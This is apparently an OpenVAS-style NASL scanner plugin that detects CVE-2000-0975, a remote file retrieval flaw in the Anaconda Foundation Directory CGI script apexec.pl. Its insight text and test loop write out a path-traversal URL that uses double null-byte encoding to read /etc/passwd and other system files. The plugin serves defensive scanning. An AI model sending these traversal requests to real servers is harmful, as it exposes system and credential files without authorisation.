# SPDX-FileCopyrightText: 2004 Noam Rathaus
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15749");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2000-0975");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/2338");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Anaconda Double NULL Encoded Remote File Retrieval");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2004 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Host/runs_unixoide");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Contact your vendor for updated software.");

  script_tag(name:"summary", value:"The remote Anaconda Foundation Directory contains a flaw
  that allows anyone to read arbitrary files with root (super-user)
  privileges.");

  script_tag(name:"insight", value:"The flaw can be misused by embedding a double null byte in a URL, as in :

  http://www.example.com/cgi-bin/apexec.pl?etype=odp&template=../../../../../../..../../etc/passwd%%0000.html&passurl=/category/");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );

files = traversal_files( "linux" );

foreach dir( make_list_unique( "/cgi-local", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file( keys( files ) ) {

    item = string(dir,"/apexec.pl?etype=odp&template=../../../../../../../../../",files[file],"%%0000.html&passurl=/category/");

    if(http_vuln_check( port:port, url:item, pattern:file, check_header:TRUE ) ) {
      report = http_report_vuln_url( port:port, url:item);
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
